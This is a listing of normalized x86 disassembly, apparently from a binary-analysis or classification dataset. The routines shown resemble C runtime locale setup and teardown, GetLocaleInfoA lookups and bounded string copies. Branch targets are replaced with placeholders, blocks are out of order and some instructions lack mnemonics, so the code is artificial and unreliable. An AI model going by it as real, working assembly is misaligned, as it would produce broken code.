call sub_42c723
push esi
push 0x37
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push [ ebp - 0x4 ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
mov ebx [ ebp - 0x8 ]
push ebx
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42c723
add esp 0x50
or edi eax
mov eax edi
pop edi
mov [ esi + 0xac ] ebx
pop ebx
leave
retn
or eax 0xffffffff
leave
retn
sub_4310f5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_424869
push [ esi + 0x8 ]
call sub_424869
push [ esi + 0xc ]
call sub_424869
push [ esi + 0x10 ]
call sub_424869
push [ esi + 0x14 ]
call sub_424869
push [ esi + 0x18 ]
call sub_424869
push [ esi ]
call sub_424869
push [ esi + 0x20 ]
call sub_424869
push [ esi + 0x24 ]
call sub_424869
push [ esi + 0x28 ]
call sub_424869
push [ esi + 0x2c ]
call sub_424869
push [ esi + 0x30 ]
call sub_424869
push [ esi + 0x34 ]
call sub_424869
push [ esi + 0x1c ]
call sub_424869
push [ esi + 0x38 ]
call sub_424869
push [ esi + 0x3c ]
call sub_424869
add esp 0x40
push [ esi + 0x40 ]
call sub_424869
push [ esi + 0x44 ]
call sub_424869
push [ esi + 0x48 ]
call sub_424869
push [ esi + 0x4c ]
call sub_424869
push [ esi + 0x50 ]
call sub_424869
push [ esi + 0x54 ]
call sub_424869
push [ esi + 0x58 ]
call sub_424869
push [ esi + 0x5c ]
call sub_424869
push [ esi + 0x60 ]
call sub_424869
push [ esi + 0x64 ]
call sub_424869
push [ esi + 0x68 ]
call sub_424869
push [ esi + 0x6c ]
call sub_424869
push [ esi + 0x70 ]
call sub_424869
push [ esi + 0x74 ]
call sub_424869
push [ esi + 0x78 ]
call sub_424869
push [ esi + 0x7c ]
call sub_424869
add esp 0x40
push [ esi + 0x80 ]
call sub_424869
push [ esi + 0x84 ]
call sub_424869
push [ esi + 0x88 ]
call sub_424869
push [ esi + 0x8c ]
call sub_424869
push [ esi + 0x90 ]
call sub_424869
push [ esi + 0x94 ]
call sub_424869
push [ esi + 0x98 ]
call sub_424869
push [ esi + 0x9c ]
call sub_424869
push [ esi + 0xa0 ]
call sub_424869
push [ esi + 0xa4 ]
call sub_424869
push [ esi + 0xa8 ]
call sub_424869
add esp 0x2c
sub_43128a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
mov ebx rw-data
je r-xdata
mov esi ebx
push 0xb8
push 0x1
call sub_42894a
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi ] esi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax edi
call sub_430cda
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ esi + 0xb4 ] 0x1
jmp r-xdata
push esi
call sub_4310f5
push esi
call sub_424869
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0xd4
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_431303
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_424869
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_424869
pop ecx
push esi
call sub_424869
pop ecx
sub_431348
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
cmp [ ebx + 0x1c ] esi
jne r-xdata
push 0x30
push 0x1
call sub_42894a
mov edi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x18 ] esi
jne r-xdata
mov esi [ ebx + 0xbc ]
push 0xc
pop ecx
push 0x4
[ edi ] [ esi ]
call sub_428905
xor esi esi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x8 ] rw-data
jmp r-xdata
mov [ eax ] esi
cmp [ ebx + 0x1c ] esi
je r-xdata
push [ ebp + 0x8 ]
call sub_424869
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0xb4 ]
mov esi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] esi
mov [ eax + 0x8 ] ecx
push 0x4
call sub_428905
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
push eax
call esi
mov [ eax ] ecx
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
movzx edi [ ebx + 0x3e ]
push esi
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_42c723
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_42c723
or [ ebp - 0xc ] eax
lea eax [ esi + 0x8 ]
push eax
push 0x10
push edi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_42c723
add esp 0x3c
or eax [ ebp - 0xc ]
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xbc ] eax
xor eax eax
push eax
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
jmp r-xdata
push esi
call sub_431303
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebx + 0xb0 ]
call sub_424869
push [ ebx + 0xbc ]
call sub_424869
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_424869
push [ ebp - 0x8 ]
call sub_424869
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
inc ecx
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_431512
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_424869
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_424869
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_424869
pop ecx
push esi
call sub_424869
pop ecx
sub_4315a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x30
push 0x1
call sub_42894a
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_428905
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_424869
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0xc
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_428905
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42c723
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42c723
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42c723
add esp 0x3c
or eax edi
je r-xdata
push ebx
call sub_424869
push [ ebp - 0x8 ]
call sub_424869
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_431512
push ebx
call sub_424869
push [ ebp - 0x8 ]
call sub_424869
push [ ebp - 0x4 ]
call sub_424869
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_424869
push [ esi + 0xb0 ]
call sub_424869
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
add eax 0xbc
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_431866
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_425eb1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
sub_4318da
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_425eb1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
sub_43198f
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_437ee2
pop ecx
pop ecx
test eax eax
jne r-xdata
jge r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_4319f1
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
test esi esi
je r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_42de10
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
lea esi [ ebp - 0xc ]
call [ GetACP@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4234de
leave
retn
push r--data
push esi
call sub_42de10
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_423a2d
pop ecx
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0xb
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_431a95
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
inc eax
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_431ab9
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov al cl
sub al 0x61
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
shl esi 0x4
lea esi [ esi + eax - 0x30 ]
add cl 0xf9
sub_431aed
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_431b08
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_42a735
mov esi eax
mov edx edi
add esi 0x9c
call sub_431ab9
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_437ee2
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_431a95
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4234de
leave
retn 0x4
or [ esi + 0x8 ] 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
sub_431ba0
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x3ff
push 0x1
or eax 0x400
push eax
mov esi ecx
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x7c ]
call sub_431ab9
cmp [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4234de
leave
retn
mov esi [ esi ]
push edi
mov edx esi
call sub_431aed
push esi
mov edi eax
call sub_4258f0
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_431c14
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_42a735
mov esi eax
mov edx edi
add esi 0x9c
call sub_431ab9
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_437ee2
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_437ee2
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_437ee2
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_423792
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_437ee2
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_4258f0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_431a95
pop ecx
